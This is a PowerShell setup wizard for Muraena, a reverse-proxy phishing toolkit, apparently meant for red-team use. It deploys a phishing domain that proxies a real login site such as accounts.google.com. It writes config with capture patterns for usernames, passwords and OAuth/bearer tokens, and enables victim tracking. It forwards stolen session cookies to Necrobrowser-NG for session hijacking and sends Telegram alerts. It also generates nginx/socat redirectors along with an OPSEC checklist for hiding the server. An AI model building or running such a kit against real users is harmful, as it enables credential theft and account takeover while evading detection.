#Requires -Version 5.1
<#
.SYNOPSIS
    Muraena — plug-and-play setup wizard for Windows.

.DESCRIPTION
    Interactive setup for Muraena on Windows.
    Handles: Docker Desktop, TLS certs, config generation, Necrobrowser-NG,
    redirector config, hosts-file entries for local demo, and launch.

.PARAMETER CI
    Non-interactive mode. Reads all settings from environment variables.
    See the CI Variables section below for the full list.

.EXAMPLE
    # Interactive
    powershell -ExecutionPolicy Bypass -File setup.ps1

    # CI / scripted
    $env:MURAENA_PHISHING_DOMAIN = "login.example.com"
    $env:MURAENA_TARGET_DOMAIN   = "accounts.google.com"
    $env:MURAENA_TLS_MODE        = "3"
    $env:MURAENA_SESSION_MODE    = "2"
    powershell -ExecutionPolicy Bypass -File setup.ps1 -CI

.NOTES
    CI Environment Variables:
      MURAENA_PHISHING_DOMAIN     required  your phishing domain (or "demo.local" for local test)
      MURAENA_TARGET_DOMAIN       required  domain to proxy
      MURAENA_TLS_MODE            1=letsencrypt  2=byo-cert  3=self-signed  4=none(HTTP)
      MURAENA_TRACKING            true/false (default: true)
      MURAENA_TOKEN_CAPTURE       true/false (default: false)
      MURAENA_SESSION_MODE        1=store-only  2=necro-docker  3=necro-external
      MURAENA_NECRO_ENDPOINT      required when SESSION_MODE=3
      MURAENA_NECRO_COOKIES       comma-separated trigger cookie names (default: sessionToken)
      MURAENA_NECRO_TASK_TYPE     office365|github|generic (default: generic)
      MURAENA_REDIRECTOR_IP       optional — redirector VPS IP
      MURAENA_REDIRECTOR_TYPE     nginx|socat (default: nginx)
      MURAENA_LOCAL_DEMO          true/false — add hosts entry + use demo.local (default: false)
      MURAENA_TELEGRAM_TOKEN      optional
      MURAENA_TELEGRAM_CHAT_ID    optional
#>

[CmdletBinding()]
param(
    [switch]$CI
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# ── Colours ───────────────────────────────────────────────────────────────────

function Write-Info  { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn  { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err   { param($m) Write-Host "[x] $m" -ForegroundColor Red; exit 1 }
function Write-Head  { param($m) Write-Host "`n=== $m ===" -ForegroundColor Cyan }
function Ask         { param($prompt, $default="")
    $d = if ($default) { " [$default]" } else { "" }
    $ans = Read-Host "$prompt$d"
    if ([string]::IsNullOrWhiteSpace($ans)) { return $default }
    return $ans.Trim()
}
function AskYN       { param($prompt, $default="N")
    $ans = Ask $prompt $default
    return $ans -match '^[Yy]'
}

# ── Admin check ───────────────────────────────────────────────────────────────

function Assert-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]$id
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Err "Please re-run PowerShell as Administrator (right-click → Run as administrator)."
    }
    Write-Info "Running as Administrator."
}

# ── Dependency checks ─────────────────────────────────────────────────────────

function Test-Command { param($cmd) return [bool](Get-Command $cmd -ErrorAction SilentlyContinue) }

function Assert-Deps {
    Write-Head "Checking Dependencies"

    # Git
    if (-not (Test-Command "git")) { Write-Err "git not found. Install from https://git-scm.com" }
    Write-Info "git: $(git --version)"

    # OpenSSL (for self-signed certs)
    if (-not (Test-Command "openssl")) {
        Write-Warn "openssl not found — needed for self-signed certs. Install Git for Windows (includes openssl)."
    }

    # Docker
    if (-not (Test-Command "docker")) {
        Write-Warn "Docker not found. Attempting install via winget..."
        Install-Docker
    } else {
        Write-Info "docker: $(docker --version)"
    }

    # docker compose
    $composeOk = $false
    try { docker compose version 2>&1 | Out-Null; $composeOk = $true } catch {}
    if (-not $composeOk) {
        Write-Err "Docker Compose v2 not found. Ensure Docker Desktop is installed and running."
    }
    Write-Info "docker compose: OK"
}

function Install-Docker {
    if (Test-Command "winget") {
        Write-Info "Installing Docker Desktop via winget (this may take a few minutes)..."
        winget install Docker.DockerDesktop --silent --accept-package-agreements --accept-source-agreements
        Write-Warn "Docker Desktop installed. You must RESTART this script after Docker finishes starting."
        Write-Warn "Start Docker Desktop from the Start Menu, wait for it to show 'Engine running', then re-run setup.ps1."
        exit 0
    } else {
        Write-Err "winget not found. Install Docker Desktop manually from https://www.docker.com/products/docker-desktop/"
    }
}

# ── Public IP ─────────────────────────────────────────────────────────────────

function Get-PublicIP {
    $urls = @("https://ifconfig.me", "https://api.ipify.org", "https://icanhazip.com")
    foreach ($url in $urls) {
        try {
            $ip = (Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5).Content.Trim()
            if ($ip -match '^\d{1,3}(\.\d{1,3}){3}$') { return $ip }
        } catch {}
    }
    return "unknown"
}

# ── DNS check ─────────────────────────────────────────────────────────────────

function Test-DNS {
    param($Domain, $IsLocalDemo)
    if ($IsLocalDemo) { return }  # local demo uses hosts file, skip DNS check

    Write-Head "DNS Check"
    $serverIP = Get-PublicIP
    Write-Info "Server public IP: $serverIP"

    try {
        $resolved = [System.Net.Dns]::GetHostAddresses($Domain) | Select-Object -First 1 -ExpandProperty IPAddressToString
        if ($resolved -ne $serverIP -and $serverIP -ne "unknown") {
            Write-Warn "$Domain resolves to $resolved but this server is $serverIP"
            Write-Warn "If using a redirector this is expected. Otherwise update your DNS A record."
            if (-not $CI) {
                $cont = AskYN "Continue anyway?" "Y"
                if (-not $cont) { exit 0 }
            }
        } else {
            Write-Info "$Domain → $resolved OK"
        }
    } catch {
        Write-Warn "Cannot resolve $Domain — DNS not configured yet?"
        Write-Warn "Let's Encrypt will fail until the domain resolves to this server."
    }
}

# ── Hosts file for local demo ─────────────────────────────────────────────────

function Set-HostsEntry {
    param($Domain)
    $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
    $entry     = "127.0.0.1`t$Domain"
    $content   = Get-Content $hostsPath -Raw

    if ($content -match [regex]::Escape($Domain)) {
        Write-Info "Hosts entry for $Domain already present."
        return
    }
    Add-Content -Path $hostsPath -Value "`n$entry"
    Write-Info "Added to hosts file: $entry"
    Write-Warn "If your browser cached the old DNS, flush it:  ipconfig /flushdns"
}

function Remove-HostsEntry {
    param($Domain)
    $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
    $lines = Get-Content $hostsPath | Where-Object { $_ -notmatch [regex]::Escape($Domain) }
    Set-Content -Path $hostsPath -Value $lines
    Write-Info "Removed hosts entry for $Domain"
}

# ── TLS ───────────────────────────────────────────────────────────────────────

function Setup-TLS-SelfSigned {
    param($Domain)
    if ((Test-Path "config\cert.pem") -and (Test-Path "config\privkey.pem")) {
        Write-Info "Certificates already present — skipping."
        return
    }
    Write-Info "Generating self-signed certificate for $Domain ..."
    $opensslArgs = @(
        "req", "-x509", "-newkey", "rsa:4096", "-sha256", "-days", "825", "-nodes",
        "-keyout", "config\privkey.pem",
        "-out",    "config\cert.pem",
        "-subj",   "/CN=$Domain",
        "-addext", "subjectAltName=DNS:$Domain"
    )
    & openssl @opensslArgs 2>&1 | Out-Null
    Copy-Item "config\cert.pem" "config\fullchain.pem" -Force
    Write-Warn "Self-signed cert generated. Browsers will show a security warning — click 'Advanced → Proceed'."
    Write-Warn "To trust it permanently: Settings → Manage Certificates → Trusted Root CAs → Import config\cert.pem"
}

function Setup-TLS-LetsEncrypt {
    param($Domain)
    if ((Test-Path "config\cert.pem") -and (Test-Path "config\privkey.pem")) {
        Write-Info "Certificates already present — skipping."
        return
    }
    if (-not (Test-Command "certbot")) {
        Write-Warn "certbot not found. Installing via winget..."
        winget install EFF.Certbot --accept-package-agreements --accept-source-agreements
    }
    Write-Info "Requesting Let's Encrypt certificate for $Domain (HTTP-01)..."
    Write-Warn "Port 80 must be reachable from the internet. Stop any local web servers first."
    & certbot certonly --standalone --non-interactive --agree-tos --register-unsafely-without-email -d $Domain
    $base = "C:\Certbot\live\$Domain"
    Copy-Item "$base\cert.pem"      "config\cert.pem"      -Force
    Copy-Item "$base\privkey.pem"   "config\privkey.pem"   -Force
    Copy-Item "$base\fullchain.pem" "config\fullchain.pem" -Force
    Write-Info "Certificates saved to config\"
    Write-Info "Auto-renewal: certbot renew runs automatically via Windows Task Scheduler."
    Write-Info "After renewal, manually copy new certs to config\ and restart containers."
}

function Setup-TLS-BYO {
    Write-Head "Bring Your Own Certificates"
    $certPath  = Ask "Path to cert.pem"
    $keyPath   = Ask "Path to privkey.pem"
    $chainPath = Ask "Path to fullchain.pem (press Enter to use cert.pem)"
    if ([string]::IsNullOrWhiteSpace($chainPath)) { $chainPath = $certPath }
    Copy-Item $certPath  "config\cert.pem"      -Force
    Copy-Item $keyPath   "config\privkey.pem"   -Force
    Copy-Item $chainPath "config\fullchain.pem" -Force
    Write-Info "Certificates copied to config\"
}

# ── Redirector config ─────────────────────────────────────────────────────────

function Setup-Redirector {
    param($RedirectorIP, $RedirectorType, $PhishingDomain)
    $muraenaIP = Get-PublicIP

    Write-Head "Redirector Configuration"
    Write-Info "Muraena IP (keep SECRET): $muraenaIP"
    Write-Info "Redirector IP (in DNS):   $RedirectorIP"

    New-Item -ItemType Directory -Path "config\redirector" -Force | Out-Null

    if ($RedirectorType -eq "nginx") {
        $nginxConf = @"
# Muraena Redirector -- nginx stream (TCP pass-through)
# Deploy on your redirector VPS (NOT this machine).
# DNS A record: $PhishingDomain --> $RedirectorIP
#
# Install:  apt-get install -y nginx
# Place at: /etc/nginx/nginx.conf
# Start:    systemctl restart nginx

stream {
    server {
        listen     443;
        proxy_pass ${muraenaIP}:443;
        proxy_timeout 600s;
        proxy_connect_timeout 10s;
    }
    server {
        listen     80;
        proxy_pass ${muraenaIP}:80;
        proxy_timeout 60s;
    }
}
"@
        Set-Content "config\redirector\nginx.conf" $nginxConf
        Write-Info "nginx config written to config\redirector\nginx.conf"
    } else {
        $socatScript = @"
#!/usr/bin/env bash
# Run on your redirector VPS.
# DNS A record: $PhishingDomain --> $RedirectorIP
set -euo pipefail
MURAENA_IP="${muraenaIP}"
apt-get install -y -qq socat 2>/dev/null || yum install -y socat 2>/dev/null || true
socat TCP4-LISTEN:443,fork,reuseaddr TCP4:`${MURAENA_IP}:443 &
socat TCP4-LISTEN:80,fork,reuseaddr  TCP4:`${MURAENA_IP}:80  &
echo "[+] socat redirector running: 443/80 --> `${MURAENA_IP}"
"@
        Set-Content "config\redirector\socat-redirector.sh" $socatScript
        Write-Info "socat script written to config\redirector\socat-redirector.sh"
    }

    Write-Warn "OPSEC checklist:"
    Write-Warn "  1. DNS A record for $PhishingDomain --> $RedirectorIP  (NOT $muraenaIP)"
    Write-Warn "  2. Firewall on Muraena server: allow 80/443 ONLY from $RedirectorIP"
    Write-Warn "  3. Never expose Muraena's IP in emails, certs, or logs"
    Write-Warn "  4. Use DNS-01 Let's Encrypt (avoids port-80 exposure on Muraena)"
}

# ── Gather config (interactive or CI) ────────────────────────────────────────

function Get-Config {
    if ($CI) {
        $cfg = @{
            PhishingDomain = $env:MURAENA_PHISHING_DOMAIN
            TargetDomain   = $env:MURAENA_TARGET_DOMAIN
            TLSChoice      = if ($env:MURAENA_TLS_MODE)      { $env:MURAENA_TLS_MODE }      else { "4" }
            TrackingChoice = if ($env:MURAENA_TRACKING)      { $env:MURAENA_TRACKING }      else { "true" }
            TokenCapture   = if ($env:MURAENA_TOKEN_CAPTURE) { $env:MURAENA_TOKEN_CAPTURE } else { "false" }
            SessionMode    = if ($env:MURAENA_SESSION_MODE)  { $env:MURAENA_SESSION_MODE }  else { "1" }
            NecroCookies   = if ($env:MURAENA_NECRO_COOKIES) { $env:MURAENA_NECRO_COOKIES } else { "sessionToken" }
            NecroTaskType  = if ($env:MURAENA_NECRO_TASK_TYPE){ $env:MURAENA_NECRO_TASK_TYPE} else { "generic" }
            NecroEndpoint  = if ($env:MURAENA_NECRO_ENDPOINT) { $env:MURAENA_NECRO_ENDPOINT } else { "" }
            RedirectorIP   = if ($env:MURAENA_REDIRECTOR_IP)  { $env:MURAENA_REDIRECTOR_IP } else { "" }
            RedirectorType = if ($env:MURAENA_REDIRECTOR_TYPE) { $env:MURAENA_REDIRECTOR_TYPE } else { "nginx" }
            LocalDemo      = if ($env:MURAENA_LOCAL_DEMO)    { $env:MURAENA_LOCAL_DEMO -eq "true" } else { $false }
            TGToken        = if ($env:MURAENA_TELEGRAM_TOKEN)   { $env:MURAENA_TELEGRAM_TOKEN }   else { "" }
            TGChatID       = if ($env:MURAENA_TELEGRAM_CHAT_ID) { $env:MURAENA_TELEGRAM_CHAT_ID } else { "" }
        }
        if (-not $cfg.PhishingDomain) { Write-Err "MURAENA_PHISHING_DOMAIN must be set" }
        if (-not $cfg.TargetDomain)   { Write-Err "MURAENA_TARGET_DOMAIN must be set" }
        if ($cfg.SessionMode -eq "2") { $cfg.NecroEndpoint = "http://necrobrowser:3000/instrument" }
        if ($cfg.SessionMode -eq "3" -and -not $cfg.NecroEndpoint) {
            Write-Err "MURAENA_NECRO_ENDPOINT must be set when SESSION_MODE=3"
        }
        Write-Info "CI mode — loaded from environment variables."
        return $cfg
    }

    # ── interactive ────────────────────────────────────────────────────────────
    Write-Head "Core Configuration"

    $phishingDomain = Ask "Phishing domain (e.g. evil.example.com, or 'demo.local' to test locally)"
    if ([string]::IsNullOrWhiteSpace($phishingDomain)) { Write-Err "Phishing domain is required." }

    $localDemo = $phishingDomain -match '\.local$' -or $phishingDomain -match '^localhost'
    if (-not $localDemo) {
        $localDemo = AskYN "Is this a local demo (adds a hosts file entry, no real DNS needed)?" "N"
    }

    $targetDomain = Ask "Target domain to proxy (e.g. accounts.google.com, or example.com for demo)"
    if ([string]::IsNullOrWhiteSpace($targetDomain)) { Write-Err "Target domain is required." }

    # ── redirector ────────────────────────────────────────────────────────────
    Write-Head "Opsec — Redirector"
    Write-Host "  A redirector hides this server's real IP. DNS points to the redirector VPS;"
    Write-Host "  it TCP-forwards all traffic here. If the domain gets burned, swap the redirector."
    $redirectorIP   = ""
    $redirectorType = "nginx"
    if (-not $localDemo) {
        if (AskYN "Use a redirector VPS?" "N") {
            $redirectorIP = Ask "Redirector VPS IP address"
            if ([string]::IsNullOrWhiteSpace($redirectorIP)) { Write-Err "Redirector IP required." }
            Write-Host "  1) nginx  (TCP stream proxy — recommended)"
            Write-Host "  2) socat  (simple port forwarder)"
            $rt = Ask "Redirector type [1/2]" "1"
            if ($rt -eq "2") { $redirectorType = "socat" }
        }
    }

    # ── TLS ───────────────────────────────────────────────────────────────────
    Write-Head "TLS / HTTPS"
    if ($redirectorIP) {
        Write-Host "  Note: with a redirector, DNS-01 is best (port 80 stays closed on this server)."
        Write-Host "  On Windows, use option 2 (BYO cert) or 3 (self-signed) most of the time."
    }
    if ($localDemo) {
        Write-Host "  Local demo detected — defaulting to self-signed (option 3)."
    }
    Write-Host "  1) Let's Encrypt  (needs port 80 open + public domain)"
    Write-Host "  2) Bring your own cert (you supply cert/key/chain paths)"
    Write-Host "  3) Self-signed    (testing / LAN — browser warning)"
    Write-Host "  4) None           (plain HTTP on port 8080)"
    $tlsDefault = if ($localDemo) { "3" } else { "1" }
    $tlsChoice  = Ask "Choose [1/2/3/4]" $tlsDefault

    # ── tracking ──────────────────────────────────────────────────────────────
    Write-Head "Tracking"
    $trackingChoice = if (AskYN "Enable victim tracking?" "Y") { "true" } else { "false" }
    $tokenCapture   = if (AskYN "Enable OAuth/bearer token capture?" "N") { "true" } else { "false" }

    # ── session / necrobrowser ────────────────────────────────────────────────
    Write-Head "Session Handling"
    Write-Host "  1) Store only       — save to Redis; inspect with redis-cli"
    Write-Host "  2) Store + send     — Redis + Necrobrowser-NG in Docker (auto-pulled)"
    Write-Host "  3) Store + send     — Redis + existing Necrobrowser-NG instance"
    $sessionMode  = Ask "Choose [1/2/3]" "1"
    $necroEndpoint = ""
    $necroCookies  = "sessionToken"
    $necroTaskType = "generic"
    if ($sessionMode -in @("2","3")) {
        if ($sessionMode -eq "3") {
            $necroEndpoint = Ask "Necrobrowser-NG endpoint URL"
            if ([string]::IsNullOrWhiteSpace($necroEndpoint)) { Write-Err "Endpoint required." }
        } else {
            $necroEndpoint = "http://necrobrowser:3000/instrument"
        }
        $necroCookies  = Ask "Trigger cookie name(s) (comma-separated)" "sessionToken"
        $necroTaskType = Ask "Task type (office365/github/generic)" "generic"
    }

    # ── telegram ──────────────────────────────────────────────────────────────
    Write-Head "Telegram Alerts"
    $tgToken  = ""
    $tgChatID = ""
    if (AskYN "Enable Telegram alerts?" "N") {
        $tgToken  = Ask "Bot token"
        $tgChatID = Ask "Chat ID (e.g. -1001234567890)"
    }

    return @{
        PhishingDomain = $phishingDomain
        TargetDomain   = $targetDomain
        TLSChoice      = $tlsChoice
        TrackingChoice = $trackingChoice
        TokenCapture   = $tokenCapture
        SessionMode    = $sessionMode
        NecroCookies   = $necroCookies
        NecroTaskType  = $necroTaskType
        NecroEndpoint  = $necroEndpoint
        RedirectorIP   = $redirectorIP
        RedirectorType = $redirectorType
        LocalDemo      = $localDemo
        TGToken        = $tgToken
        TGChatID       = $tgChatID
    }
}

# ── Write config.toml ─────────────────────────────────────────────────────────

function Write-Config {
    param($Cfg)
    $tlsEnable    = "false"
    $port         = "8080"
    $httpRedirect = "false"
    if ($Cfg.TLSChoice -in @("1","2","3")) {
        $tlsEnable = "true"; $port = "443"; $httpRedirect = "true"
    }

    $tokenBlock = ""
    if ($Cfg.TokenCapture -eq "true") {
        $tokenBlock = @"

[tracking.tokens]
    enable        = true
    captureBearer = true
    keys  = ["access_token", "refresh_token", "id_token", "token", "bearer_token"]
    paths = [
        "/oauth/token", "/oauth2/token", "/token",
        "/api/token",   "/connect/token", "/auth/token",
        "/login/oauth/access_token",
    ]
"@
    }

    $necroBlock = ""
    if ($Cfg.SessionMode -in @("2","3")) {
        $cookieArr = ($Cfg.NecroCookies -split ",") | ForEach-Object { "`"$($_.Trim())`"" }
        $cookieToml = "[" + ($cookieArr -join ", ") + "]"
        $necroBlock = @"

[necrobrowser]
    enable   = true
    endpoint = "$($Cfg.NecroEndpoint)"
    profile  = "./config/instrument.necro"

    [necrobrowser.trigger]
        type   = "cookies"
        values = $cookieToml
        delay  = 10
"@
    }

    $tgBlock = ""
    if ($Cfg.TGToken -and $Cfg.TGChatID) {
        $tgBlock = @"

[telegram]
    enable   = true
    botToken = "$($Cfg.TGToken)"
    chatIDs  = ["$($Cfg.TGChatID)"]
"@
    }

    $redisHost = "redis"  # Docker service name; use 127.0.0.1 for non-Docker

    $toml = @"
# Generated by setup.ps1 -- $(Get-Date -Format "yyyy-MM-dd HH:mm UTC" -AsUTC)

[proxy]
    phishing    = "$($Cfg.PhishingDomain)"
    destination = "$($Cfg.TargetDomain)"
    port        = $port

    [proxy.HTTPtoHTTPS]
        enable   = $httpRedirect
        HTTPport = 80

[transform]
    [transform.base64]
        enable  = false
        padding = ["=", "."]
    [transform.response]
        skipContentType = ["font/*", "image/*"]

[log]
    enable = true

[redis]
    host = "$redisHost"
    port = 6379

[tls]
    enable      = $tlsEnable
    expand      = false
    certificate = "./config/cert.pem"
    key         = "./config/privkey.pem"
    root        = "./config/fullchain.pem"
    minVersion  = "TLS1.2"
    renegotiationSupport = "Never"

[tracking]
    enable             = $($Cfg.TrackingChoice)
    trackRequestCookie = true

    [tracking.trace]
        identifier = "_uid"
        validator  = "[a-zA-Z0-9]{8}"
        header     = "X-Track"
        [tracking.trace.landing]
            type   = "query"
            header = "X-Landing"

[tracking.secrets]
    paths = ["/login", "/signin", "/auth", "/session"]
    [[tracking.secrets.patterns]]
        label = "Username"
        start = "username="
        end   = "&"
    [[tracking.secrets.patterns]]
        label = "Password"
        start = "password="
        end   = "&"
$tokenBlock
$necroBlock
$tgBlock
"@

    Set-Content "config\config.toml" $toml -Encoding UTF8
    Write-Info "config\config.toml written."
}

# ── Write instrument.necro ────────────────────────────────────────────────────

function Write-NecroProfile {
    param($Cfg)
    $profile = @"
{
  "name": "%%%TRACKER%%%",
  "task": {
    "type": "$($Cfg.NecroTaskType)",
    "name": ["ScreenshotPages"],
    "params": {
      "fixSession": "https://$($Cfg.TargetDomain)",
      "credentials": %%%CREDENTIALS%%%,
      "tokens": %%%TOKENS%%%
    }
  },
  "cookies": %%%COOKIES%%%
}
"@
    Set-Content "config\instrument.necro" $profile -Encoding UTF8
    Write-Info "config\instrument.necro written."
}

# ── Docker Compose override for Necrobrowser ──────────────────────────────────

function Write-ComposeOverride {
    param($SessionMode)
    if ($SessionMode -ne "2") { return }

    Write-Info "Cloning Necrobrowser-NG..."
    if (-not (Test-Path "necrobrowser-ng")) {
        git clone --depth 1 --quiet https://github.com/muraenateam/necrobrowser.git necrobrowser-ng
    } else {
        Write-Info "necrobrowser-ng\ already present, skipping clone."
    }

    $override = @"
# Auto-generated by setup.ps1
services:
  necrobrowser:
    build: ./necrobrowser-ng
    restart: unless-stopped
    ports:
      - "3000:3000"
    depends_on:
      redis:
        condition: service_healthy
    environment:
      - REDIS_HOST=redis
      - REDIS_PORT=6379
"@
    Set-Content "docker-compose.override.yml" $override -Encoding UTF8
    Write-Info "docker-compose.override.yml written."
}

# ── Launch ────────────────────────────────────────────────────────────────────

function Start-Muraena {
    param($Cfg)
    Write-Head "Starting Muraena"
    docker compose build 2>&1 | Select-Object -Last 5 | ForEach-Object { Write-Host "  $_" }
    docker compose up -d

    Write-Host ""
    Write-Info "Muraena is running!"
    Write-Host ""
    Write-Host "  Phishing domain : $($Cfg.PhishingDomain)" -ForegroundColor Cyan
    Write-Host "  Proxying        : $($Cfg.TargetDomain)"   -ForegroundColor Cyan
    if ($Cfg.TLSChoice -in @("1","2","3")) {
        Write-Host "  URL             : https://$($Cfg.PhishingDomain)" -ForegroundColor Green
    } else {
        Write-Host "  URL             : http://$($Cfg.PhishingDomain):8080" -ForegroundColor Yellow
    }
    switch ($Cfg.SessionMode) {
        "1" { Write-Host "  Sessions        : Store in Redis only" }
        "2" { Write-Host "  Sessions        : Redis + Necrobrowser-NG (Docker)" }
        "3" { Write-Host "  Sessions        : Redis + Necrobrowser-NG at $($Cfg.NecroEndpoint)" }
    }
    if ($Cfg.RedirectorIP) {
        Write-Host "  Redirector      : $($Cfg.RedirectorIP) ($($Cfg.RedirectorType)) -- see config\redirector\" -ForegroundColor Yellow
    }
    if ($Cfg.LocalDemo) {
        Write-Host ""
        Write-Warn "Local demo: open https://$($Cfg.PhishingDomain) in your browser."
        Write-Warn "Click 'Advanced' then 'Proceed' to bypass the self-signed cert warning."
        Write-Warn "Add ?_uid=test123 to tag the session: https://$($Cfg.PhishingDomain)/?_uid=test123"
    }
    Write-Host ""
    Write-Host "  Inspect Redis   : docker compose exec redis redis-cli hgetall victim:<ID>"
    Write-Host "  Logs            : docker compose logs -f muraena"
    Write-Host "  Stop            : docker compose down"
    Write-Host "  Re-run setup    : powershell -ExecutionPolicy Bypass -File setup.ps1"
    Write-Host ""
}

# ── Main ──────────────────────────────────────────────────────────────────────

function Main {
    $banner = @"

+======================================+
|   Muraena -- Plug & Play Setup       |
|   Windows Edition                    |
+======================================+
"@
    Write-Host $banner -ForegroundColor Cyan

    Assert-Admin
    Assert-Deps

    # Ensure we're in the repo root
    if (-not (Test-Path "config\config.toml") -and -not (Test-Path "go.mod")) {
        Write-Err "Run this script from the Muraena repository root (where go.mod lives)."
    }

    $cfg = Get-Config

    # DNS check (skip for local demo)
    Test-DNS -Domain $cfg.PhishingDomain -IsLocalDemo $cfg.LocalDemo

    # Hosts file entry for local demo
    if ($cfg.LocalDemo) {
        Write-Head "Hosts File"
        Set-HostsEntry -Domain $cfg.PhishingDomain
    }

    # TLS
    Write-Head "TLS"
    switch ($cfg.TLSChoice) {
        "1" { Setup-TLS-LetsEncrypt -Domain $cfg.PhishingDomain }
        "2" { Setup-TLS-BYO }
        "3" { Setup-TLS-SelfSigned -Domain $cfg.PhishingDomain }
        default { Write-Info "Skipping TLS (HTTP mode on port 8080)." }
    }

    # Write configs
    Write-Head "Writing Configuration"
    Write-Config     -Cfg $cfg
    if ($cfg.SessionMode -in @("2","3")) {
        Write-NecroProfile   -Cfg $cfg
        Write-ComposeOverride -SessionMode $cfg.SessionMode
    }
    if ($cfg.RedirectorIP) {
        Setup-Redirector -RedirectorIP $cfg.RedirectorIP `
                         -RedirectorType $cfg.RedirectorType `
                         -PhishingDomain $cfg.PhishingDomain
    }

    # Launch
    Start-Muraena -Cfg $cfg
}

Main
